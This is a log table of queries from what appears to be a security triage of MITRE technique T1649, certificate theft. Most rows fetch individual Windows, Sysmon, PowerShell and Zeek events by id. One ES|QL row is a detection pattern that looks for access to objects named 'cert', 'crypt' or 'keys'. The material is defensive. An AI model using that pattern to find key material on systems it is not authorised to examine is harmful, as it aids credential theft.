| q-3f21cbea60 | triage T1649 step 7 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4663\" AND (TO_LOWER(win.ObjectName) LIKE \"*cert*\" OR TO_LOWER(win.ObjectName) LIKE \"*crypt*\" OR TO_LOWER(win.ObjectName) LIKE \"*keys*\") \| KEEP @timestamp, host.… | 2 | F57 |
| q-4c70e81ff3 | triage T1649 step 8 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo5W"} | None | F56 |
| q-745e706e56 | triage T1649 step 8 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo5u"} | None | F56 |
| q-7cd2e0d1a6 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo5u"} | None |  |
| q-de33d20e84 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo5u"} | None |  |
| q-79a4af15ee | triage T1649 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo5u"} | None |  |
| q-9fd3b631d0 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo5W"} | None |  |
| q-6f99946b1c | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-09455679f8 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-26a3e9cc05 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQb3a"} | None |  |
| q-7cc85655c3 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCRb2e"} | None |  |
| q-9fd62e5958 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhDM5P"} | None |  |
| q-6834443b5e | triage T1649 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhDM5P"} | None |  |
| q-693afc7ab6 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhDM5P"} | None |  |
| q-721da21e6e | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkmtAyJ"} | None |  |
| q-2d0f735675 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhDM45"} | None |  |
| q-0b83e4c30e | triage T1649 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjFEcb"} | None |  |
| q-dfbdfd3201 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjFEcb"} | None |  |
| q-0db490ea07 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItse-35u"} | None |  |
| q-0f57ef7754 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItse-35u"} | None |  |
| q-8867f5f10e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-a3815585d6 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-a388d2795d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-c028e3fbbd | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo57"} | None |  |
| q-4fe2983676 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo57"} | None |  |
| q-ef55b7c3b6 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo54"} | None |  |
| q-5e1cf59158 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-072975533f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpVlTKv"} | None |  |
| q-bd4de67794 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-3c7e01950e | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjYpu"} | None |  |
| q-f2f60ac2a2 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwBj58r"} | None |  |
| q-dd750373bb | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpMctHN"} | None |  |
| q-0fbf730735 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxYBM3"} | None |  |
| q-3019a69ef5 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxYBM3"} | None |  |
| q-c9edcfe121 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxYBMV"} | None |  |
| q-68eb2f9b27 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxYBM_"} | None |  |
| q-bcfaae79e5 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwwWlFq"} | None |  |
| q-a61966af3e | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhC87m"} | None |  |
| q-24befb9770 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhC87m"} | None |  |
| q-612abde87e | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhC87m"} | None |  |
| q-c1f985c471 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxYBM3"} | None |  |
| q-d8a57efa7a | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhC87m"} | None |  |
| q-8000041219 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo54"} | None |  |
| q-5601e6d167 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsU5KNV"} | None |  |
| q-4d47de7db0 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsU5KNV"} | None |  |
| q-ef6db191eb | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsS3MUJ"} | None |  |
| q-eaa8c56495 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkYcTxy"} | None |  |
| q-3b0a5d5993 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpo7P8B"} | None |  |
| q-34053414c1 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWXW"} | None |  |
| q-709418c76c | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWXW"} | None |  |
| q-3244863038 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpMcdEH"} | None |  |
| q-b19c08bafd | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwHp5Zy"} | None |  |
| q-33925a7888 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchIttyFQcI"} | None |  |
| q-11c4dbf7d4 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrovu"} | None |  |
| q-3ffe90a1cf | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylr4ug"} | None |  |
| q-4d0654a997 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjYrA"} | None |  |
| q-4f6cd3659a | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjYrA"} | None |  |
| q-c75aef4ba8 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjoor"} | None |  |
| q-dd69a65ab1 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjopc"} | None |  |
| q-a5551728b3 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz_h1K2"} | None |  |
| q-0cce4ee2cd | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWX1"} | None |  |
| q-010bc5424c | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWWO"} | None |  |
| q-5d4b57d2d8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpLb9km"} | None |  |
| q-5149d4eff3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpLb9km"} | None |  |
| q-42a5295250 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-aa23456f2f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-d4f029b3df | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-0dc7d28d80 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-101e0f8733 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpgwo_a"} | None |  |
| q-3b3f690e38 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-328d096378 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjFEcw"} | None |  |
| q-3a2fa8a38d | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsO1YsM"} | None |  |
| q-6e863e21d8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-3fe2e17094 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-a4db70c65e | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsS38Vi"} | None |  |
| q-6ae8f0308b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsS38Vi"} | None |  |
| q-a75052a492 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjE0ff"} | None |  |
| q-b2135bd1a5 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjFEcw"} | None |  |
| q-794d72d062 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2b9g"} | None |  |
| q-7a8cb46c86 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsO1YsM"} | None |  |
| q-35d5ea44a6 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsO1YsM"} | None |  |
| q-f73623f7c2 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAt"} | None |  |
| q-f53bb23fba | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAu"} | None |  |
| q-ea9729380b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-0b2369dee0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-f634ea89e3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-688c553a54 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkCwA"} | None |  |
| q-af477c6ec0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpk0gjm"} | None |  |
| q-60800aafa9 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpIWWNw"} | None |  |
| q-bf4512f816 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpIWWNw"} | None |  |
| q-17727f6936 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpizV0l"} | None |  |
| q-595498bb9c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpESdr2"} | None |  |
| q-3cbccf3060 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWW2"} | None |  |
| q-96b0d893a8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpEStoK"} | None |  |
| q-8b1a783786 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpEStoK"} | None |  |
| q-8d77c2ef84 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHoX1uOFchItn-BEDj"} | None |  |
| q-611e5923ea | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHoX1uOFchItj59cFt"} | None |  |
| q-9165038766 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkHK8X3"} | None |  |
| q-50ce07eab8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHoX1uOFchItj59cEe"} | None |  |
| q-adc4d290b5 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-2da2f519c4 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-94ca6f8940 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAt"} | None |  |
| q-aa94b97e03 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkady05"} | None |  |
| q-b69748f3f6 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjopf"} | None |  |
| q-9994b4fda8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-8c1e630523 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-cc8a72e6c1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkKNZkz"} | None |  |
| q-9254dbbe23 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkKNpkH"} | None |  |
| q-eb9a1332a1 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxXBOw"} | None |  |
| q-96075c55d3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkx5Y1-"} | None |  |
| q-3072797b2b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr1M"} | None |  |
| q-7d2b0dfd1d | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSzI"} | None |  |
| q-a7dfc0d1ac | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSzI"} | None |  |
| q-2188cacb5f | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSzI"} | None |  |
| q-0a370120c1 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSxb"} | None |  |
| q-1a583be224 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-e03c8b43a7 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-0fe4a2b384 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCRb2e"} | None |  |
| q-73c5e17efb | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCRb2e"} | None |  |
| q-4a10b1d6fa | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkx5Y3M"} | None |  |
| q-443c15f897 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkmtdLv"} | None |  |
| q-b5cc119a7c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-a1a1ba58ff | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-2d386e9d3d | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYmUF"} | None |  |
| q-5abda7cc9b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-81cbc8371b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-ddaae096a2 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpHV4S3"} | None |  |
| q-f9a5368e20 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSwG"} | None |  |
| q-50b0260850 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkHK8V2"} | None |  |
| q-1fdd53884f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-dd7dca859a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-6b20f9320b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-39acefbda5 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-0519de50b9 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-0b3aac05a6 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo54"} | None |  |
| q-118b18d3f2 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo54"} | None |  |
| q-7402c299df | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz-ho2U"} | None |  |
| q-8989b68ef7 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjYpu"} | None |  |
| q-7902a15da4 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-1c8cdbf7d2 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYmUF"} | None |  |
| q-af22a03b68 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWX1"} | None |  |
| q-08cb876f92 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-2f4d8bf49b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-a8e63d8a44 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-cff4e2cf16 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpgwo_a"} | None |  |
| q-c3f4f69931 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-3f77ac0407 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAx"} | None |  |
| q-93ad3882cb | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSxb"} | None |  |
| q-b6c50faa33 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-6dd50612b0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-1c590584c3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw468x"} | None |  |
| q-d903d29f72 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAz"} | None |  |
| q-9730528c1b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JBe"} | None |  |
| q-bbc47f53b8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAz"} | None |  |
| q-2758e4f7a4 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwDl0_c"} | None |  |
| q-a5f3684e58 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjE0ff"} | None |  |
| q-71cdae8984 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWV3"} | None |  |
| q-2d961c7112 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWXW"} | None |  |
| q-f63c909344 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAs"} | None |  |
| q-ad23a953d0 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwIqjKK"} | None |  |
| q-12d21a8f26 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItknvJ-S"} | None |  |
| q-1207d1176d | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWV3"} | None |  |
| q-f3ce87908d | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylr4ud"} | None |  |
| q-4222e7c098 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrovU"} | None |  |
| q-58937d6d61 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrouG"} | None |  |
| q-ddde61e4eb | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqO44j"} | None |  |
| q-9f145e7a8e | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrovu"} | None |  |
| q-1bd4012066 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrot8"} | None |  |
| q-0a95646f16 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpfwJ9Y"} | None |  |
| q-505d1eb302 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkYcTxy"} | None |  |
| q-b3bf8fa201 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpp7sSn"} | None |  |
| q-8e63648429 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrotQ"} | None |  |
| q-ccc1eabef1 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrotP"} | None |  |
| q-c395c6aa03 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkady05"} | None |  |
| q-3da9d79ead | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAu"} | None |  |
| q-8790e13aa4 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxYBM6"} | None |  |
| q-50aaac3b50 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrovz"} | None |  |
| q-2236b5c414 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAt"} | None |  |
| q-c0a265f533 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxXRNx"} | None |  |
| q-2892f219e8 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrovy"} | None |  |
| q-eb8e0c6dad | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItz8vIp5"} | None |  |
| q-9b36414439 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkbfEQ2"} | None |  |
| q-b7e8a82442 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrov7"} | None |  |
| q-e47fc7ca9c | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrotT"} | None |  |
| q-4ee1c335b7 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrotQ"} | None |  |
| q-6fbd5a4998 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItz8vIp3"} | None |  |
| q-339f45e070 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItz8vIp4"} | None |  |
| q-730b4f97d0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpgwo_a"} | None |  |
| q-82e1a4bcff | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwHqJZm"} | None |  |
